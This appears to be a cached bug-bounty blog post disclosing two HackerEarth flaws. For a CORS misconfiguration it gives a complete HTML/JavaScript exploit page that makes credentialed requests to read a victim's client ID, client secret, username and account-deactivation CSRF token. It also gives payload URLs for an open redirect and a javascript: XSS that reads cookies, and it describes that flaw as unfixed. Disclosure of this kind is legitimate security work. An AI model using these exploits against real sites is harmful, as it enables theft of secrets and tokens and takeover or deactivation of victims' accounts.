@@ -1,0 +1,102 @@
+I"@7<p>Hi all,</p>
+
+<p>I found two bugs in hackerearth. one of them is fixed and other is still not fixed.</p>
+
+<h3 id="1-cores-misconfiguration-fixed">1. cores misconfiguration (fixed)</h3>
+
+<p>When i change the origin header in request to <code class="highlighter-rouge">https://www.hackerearth.com.evil.com</code> the responce i got is:</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Access</span><span class="o">-</span><span class="n">Control</span><span class="o">-</span><span class="n">Allow</span><span class="o">-</span><span class="n">Credentials</span><span class="p">:</span> <span class="n">true</span>
+<span class="n">Access</span><span class="o">-</span><span class="n">Control</span><span class="o">-</span><span class="n">Allow</span><span class="o">-</span><span class="n">Origin</span><span class="p">:</span> <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">www</span><span class="o">.</span><span class="n">hackerearth</span><span class="o">.</span><span class="n">com</span><span class="o">.</span><span class="n">evil</span><span class="o">.</span><span class="n">com</span>
+</code></pre></div></div>
+
+<p>I backend regex onlly check for <code class="highlighter-rouge">www.hackerearth.com</code> after <code class="highlighter-rouge">https://</code>. So i made a subdomain of my site <code class="highlighter-rouge">www.hackerearth.com.dr3dd.live</code> after passing this domain
+in request i got the response is:</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Access</span><span class="o">-</span><span class="n">Control</span><span class="o">-</span><span class="n">Allow</span><span class="o">-</span><span class="n">Credentials</span><span class="p">:</span> <span class="n">true</span>
+<span class="n">Access</span><span class="o">-</span><span class="n">Control</span><span class="o">-</span><span class="n">Allow</span><span class="o">-</span><span class="n">Origin</span><span class="p">:</span> <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">www</span><span class="o">.</span><span class="n">hackerearth</span><span class="o">.</span><span class="n">com</span><span class="o">.</span><span class="n">dr3dd</span><span class="o">.</span><span class="n">live</span>
+</code></pre></div></div>
+
+<p>We can see <code class="highlighter-rouge">Access-Control-Allow-Credentials: true</code> for <code class="highlighter-rouge">www.hackerearth.com.dr3dd.live</code>. So i wrote a small js script to steal secrets tokens of victim.</p>
+
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;!DOCTYPE html&gt;</span>
+<span class="nt">&lt;html&gt;</span>
+<span class="nt">&lt;body&gt;</span>
+
+<span class="nt">&lt;div&gt;</span>
+<span class="nt">&lt;h1&gt;</span>Getting hackerearth Client secrets for victim!!!<span class="nt">&lt;/h1&gt;</span>
+<span class="nt">&lt;button</span> <span class="na">type=</span><span class="s">"button"</span> <span class="na">onclick=</span><span class="s">"loadDoc()"</span><span class="nt">&gt;</span>Get secrets!!!<span class="nt">&lt;/button&gt;</span>
+  <span class="nt">&lt;div</span> <span class="na">id=</span><span class="s">"demo1"</span><span class="nt">&gt;&lt;/div&gt;</span>
+  <span class="nt">&lt;div</span> <span class="na">id=</span><span class="s">"demo2"</span><span class="nt">&gt;&lt;/div&gt;</span>
+  <span class="nt">&lt;div</span> <span class="na">id=</span><span class="s">"demo3"</span><span class="nt">&gt;&lt;/div&gt;</span>
+<span class="nt">&lt;button</span> <span class="na">type=</span><span class="s">"button"</span> <span class="na">onclick=</span><span class="s">"get_csrf_token()"</span><span class="nt">&gt;</span>You can get any csrf token and make changes in victim account like this is account deactivate csrf token!!!<span class="nt">&lt;/button&gt;</span>
+  <span class="nt">&lt;div</span> <span class="na">id=</span><span class="s">"demo4"</span><span class="nt">&gt;&lt;/div&gt;</span>
+<span class="nt">&lt;/div&gt;</span>
+
+<span class="nt">&lt;script&gt;</span>
+<span class="kd">function</span> <span class="nx">loadDoc</span><span class="p">()</span> <span class="p">{</span>
+  <span class="kd">var</span> <span class="nx">xhttp</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">XMLHttpRequest</span><span class="p">();</span>
+  <span class="nx">xhttp</span><span class="p">.</span><span class="nx">onreadystatechange</span> <span class="o">=</span> <span class="kd">function</span><span class="p">()</span> <span class="p">{</span>
+    <span class="k">if</span> <span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="nx">readyState</span> <span class="o">==</span> <span class="mi">4</span> <span class="o">&amp;&amp;</span> <span class="k">this</span><span class="p">.</span><span class="nx">status</span> <span class="o">==</span> <span class="mi">200</span><span class="p">)</span> <span class="p">{</span>
+        <span class="kd">var</span> <span class="nx">parser</span><span class="o">=</span><span class="k">new</span> <span class="nx">DOMParser</span><span class="p">();</span>
+        <span class="kd">var</span> <span class="nx">xmlDoc</span><span class="o">=</span><span class="nx">parser</span><span class="p">.</span><span class="nx">parseFromString</span><span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="nx">responseText</span><span class="p">,</span> <span class="dl">"</span><span class="s2">text/html</span><span class="dl">"</span><span class="p">).</span><span class="nx">documentElement</span><span class="p">;</span>
+        <span class="kd">var</span> <span class="nx">clientId</span> <span class="o">=</span> <span class="nx">xmlDoc</span><span class="p">.</span><span class="nx">querySelector</span><span class="p">(</span><span class="dl">'</span><span class="s1">#client-id</span><span class="dl">'</span><span class="p">);</span>
+        <span class="kd">var</span> <span class="nx">clientSecret</span> <span class="o">=</span> <span class="nx">xmlDoc</span><span class="p">.</span><span class="nx">querySelector</span><span class="p">(</span><span class="dl">'</span><span class="s1">#client-secret</span><span class="dl">'</span><span class="p">);</span>
+        <span class="kd">var</span> <span class="nx">username</span> <span class="o">=</span> <span class="nx">xmlDoc</span><span class="p">.</span><span class="nx">querySelector</span><span class="p">(</span><span class="dl">'</span><span class="s1">#change-username</span><span class="dl">'</span><span class="p">);</span>
+        <span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="dl">"</span><span class="s2">demo1</span><span class="dl">"</span><span class="p">).</span><span class="nx">innerHTML</span> <span class="o">=</span> <span class="nx">clientId</span><span class="p">.</span><span class="nx">innerText</span><span class="p">;</span>
+        <span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="dl">"</span><span class="s2">demo2</span><span class="dl">"</span><span class="p">).</span><span class="nx">innerHTML</span> <span class="o">=</span> <span class="nx">clientSecret</span><span class="p">.</span><span class="nx">innerText</span><span class="p">;</span>
+        <span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="dl">"</span><span class="s2">demo3</span><span class="dl">"</span><span class="p">).</span><span class="nx">innerHTML</span> <span class="o">=</span> <span class="nx">username</span><span class="p">.</span><span class="nx">innerText</span><span class="p">.</span><span class="nx">replace</span><span class="p">(</span><span class="dl">'</span><span class="s1">Edit</span><span class="dl">'</span><span class="p">,</span><span class="dl">''</span><span class="p">);;</span>
+        
+    <span class="p">}</span>
+  <span class="p">};</span>
+  <span class="nx">xhttp</span><span class="p">.</span><span class="nx">open</span><span class="p">(</span><span class="dl">"</span><span class="s2">GET</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">https://www.hackerearth.com/users/profile-settings/</span><span class="dl">"</span><span class="p">,</span> <span class="kc">true</span><span class="p">);</span>
+  <span class="nx">xhttp</span><span class="p">.</span><span class="nx">withCredentials</span> <span class="o">=</span> <span class="kc">true</span><span class="p">;</span>
+  <span class="nx">xhttp</span><span class="p">.</span><span class="nx">send</span><span class="p">();</span>
+<span class="p">}</span>
+<span class="kd">function</span> <span class="nx">get_csrf_token</span><span class="p">(){</span>
+  <span class="kd">var</span> <span class="nx">xhttp</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">XMLHttpRequest</span><span class="p">();</span>
+    <span class="nx">xhttp</span><span class="p">.</span><span class="nx">onreadystatechange</span> <span class="o">=</span> <span class="kd">function</span><span class="p">()</span> <span class="p">{</span>
+    <span class="k">if</span> <span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="nx">readyState</span> <span class="o">==</span> <span class="mi">4</span> <span class="o">&amp;&amp;</span> <span class="k">this</span><span class="p">.</span><span class="nx">status</span> <span class="o">==</span> <span class="mi">200</span><span class="p">)</span> <span class="p">{</span>
+        <span class="kd">var</span> <span class="nx">parser</span><span class="o">=</span><span class="k">new</span> <span class="nx">DOMParser</span><span class="p">();</span>
+        <span class="kd">var</span> <span class="nx">xmlDoc</span><span class="o">=</span> <span class="nx">parser</span><span class="p">.</span><span class="nx">parseFromString</span><span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="nx">responseText</span><span class="p">,</span> <span class="dl">"</span><span class="s2">text/html</span><span class="dl">"</span><span class="p">).</span><span class="nx">documentElement</span><span class="p">;</span>
+        <span class="kd">var</span> <span class="nx">csrf</span> <span class="o">=</span> <span class="nx">xmlDoc</span><span class="p">.</span><span class="nx">querySelector</span><span class="p">(</span><span class="dl">'</span><span class="s1">#deactivate-form</span><span class="dl">'</span><span class="p">)[</span><span class="mi">0</span><span class="p">].</span><span class="nx">value</span><span class="p">;</span>
+      <span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="dl">"</span><span class="s2">demo4</span><span class="dl">"</span><span class="p">).</span><span class="nx">innerHTML</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">csrf for deactivate account : </span><span class="dl">"</span> <span class="o">+</span> <span class="nx">csrf</span><span class="p">;</span>
+    <span class="p">}</span>
+  <span class="p">};</span>
+  <span class="kd">var</span> <span class="nx">username</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="dl">"</span><span class="s2">demo3</span><span class="dl">"</span><span class="p">).</span><span class="nx">innerText</span><span class="p">;</span>
+  <span class="kd">var</span> <span class="nx">url</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">https://www.hackerearth.com/deactivate/</span><span class="dl">"</span> <span class="o">+</span> <span class="nx">username</span><span class="p">.</span><span class="nx">replace</span><span class="p">(</span><span class="dl">"</span><span class="s2">Username: </span><span class="dl">"</span><span class="p">,</span><span class="dl">""</span><span class="p">);;</span>
+  <span class="nx">xhttp</span><span class="p">.</span><span class="nx">open</span><span class="p">(</span><span class="dl">"</span><span class="s2">GET</span><span class="dl">"</span><span class="p">,</span> <span class="nx">url</span><span class="p">,</span> <span class="kc">true</span><span class="p">);</span>
+  <span class="nx">xhttp</span><span class="p">.</span><span class="nx">withCredentials</span> <span class="o">=</span> <span class="kc">true</span><span class="p">;</span>
+  <span class="nx">xhttp</span><span class="p">.</span><span class="nx">send</span><span class="p">();</span>
+<span class="p">}</span>
+  
+  
+<span class="nt">&lt;/script&gt;</span>
+
+<span class="nt">&lt;/body&gt;</span>
+<span class="nt">&lt;/html&gt;</span>
+</code></pre></div></div>
+
+<p>I have hosted it on <code class="highlighter-rouge">http://www.hackerearth.com.dr3dd.live/cores.html</code> first button steal secrets token and second one steal csrf tokens of victim.</p>
+
+<h3 id="2-xss--open-redirect-not-fixed">2. XSS + Open Redirect (not fixed)</h3>
+
+<p>This one is pretty simple bug. for open redirect go to :</p>
+
+<p><code class="highlighter-rouge">https://www.hackerearth.com/social-login-complete-page/?redirect=https://evil.com</code></p>
+
+<p>to access cookie we can use :</p>
+
+<p><code class="highlighter-rouge">https://www.hackerearth.com/social-login-complete-page/?redirect=javascript:alert(document.cookie)</code></p>
+
+<p>Here is video POC link of both bugs :</p>
+
+<p><a href="https://drive.google.com/drive/folders/1TrOvBYbtEp0gDGq2A7npSNd8_5ok8ccn?usp=sharing">POC Drive Link</a></p>
+
+<h3 id="timeline">Timeline</h3>
+
+<ol>
+  <li>March-16-2020  Submit report to hackerearth via mail</li>
+  <li>March-18-2020  Submit Detail POC for bugs</li>
+</ol>
+:ET
